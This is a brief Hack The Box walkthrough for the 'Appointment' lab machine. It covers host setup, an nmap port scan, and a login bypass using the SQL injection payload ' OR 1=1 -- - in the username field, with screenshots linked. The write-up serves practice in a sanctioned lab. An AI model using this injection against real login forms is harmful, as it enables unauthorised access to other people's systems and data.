# Appointment - Hack The Box 🏴󠁧󠁢󠁥󠁮󠁧󠁿

<img width="618" height="456" alt="image" src="https://github.com/user-attachments/assets/6b6876d8-0785-434f-9ac3-03c752be9424" />


### 1. First we prove the conexion and we add to `/etc/hosts`

```bash
ping -c3 10.129.58.162
sudo nano /etc/hosts # add 10.129.58.162 appointment.htb
```

### 2. We scan the ports with nmap.

```bash
nmap -T4 -F 10.129.58.162
```

<img width="738" height="286" alt="image" src="https://github.com/user-attachments/assets/84ec0e63-a423-4114-9b3e-7faa2434577e" />


### 3. We goes to the login and we prove a `SQL Injection`

```
#user: ' OR 1=1 -- -
#passwd: admin
```

<img width="933" height="570" alt="image" src="https://github.com/user-attachments/assets/4081910d-0a70-489c-b737-5c963ecf980d" />


### 4. We enter.

<img width="888" height="492" alt="image" src="https://github.com/user-attachments/assets/c17393ba-4d8b-4f4a-ae5a-374e34288824" />

